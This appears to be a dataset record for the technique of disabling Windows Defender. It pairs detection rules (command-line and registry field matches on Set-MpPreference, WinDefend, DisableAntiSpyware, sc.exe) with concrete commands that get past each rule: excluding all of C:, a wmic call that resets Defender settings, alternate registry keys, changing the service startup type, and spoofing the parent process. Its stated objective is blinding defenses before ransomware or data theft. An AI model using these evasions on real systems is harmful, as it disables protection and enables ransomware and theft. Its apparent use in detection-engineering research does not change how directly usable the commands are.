technique_name: Impair Defenses: Disable or Modify Tools

events.note: Registry key set — policy-based Defender disable (survives PS cmdlet reversal)
sc.exe stops the WinDefend service directly (most aggressive disable method)

mutation_hints.objective: Blind the defender before deploying ransomware or exfiltrating data
detection_anchors: Wildcard match: CommandLine contains Set-MpPreference AND Disable → use Add-MpPreference -ExclusionPath C:\ (adds an exclusion for all of C: drive — same effect as disabling, but uses a different cmdlet name that avoids 'Disable' in the command)

Field match: Image=powershell.exe AND CommandLine contains WinDefend or MpPreference → use wmic.exe: 'wmic /namespace:\\root\microsoft\windows\defender path MSFT_MpPreference call ApplyDefaultSettings' or invoke via COM object from a different process

Field match: TargetObject contains DisableAntiSpyware → use DisableRealtimeMonitoring (different registry key, same effect) or ExclusionPath under HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

Field match: CommandLine contains 'sc.exe stop WinDefend' → use 'sc config WinDefend start= disabled' (changes startup type instead of stopping) or use the service control manager API via PowerShell: Stop-Service -Name WinDefend -Force
Field: ParentImage → the process spawning the disable command is a key alert; change from a suspicious parent (cmd.exe, shell) to a legitimate-looking one (taskhost.exe, svchost.exe)
Field: IntegrityLevel=High → this must be High to disable Defender; if this alert fires specifically on High integrity, the attack requires this level — focus on other fields instead
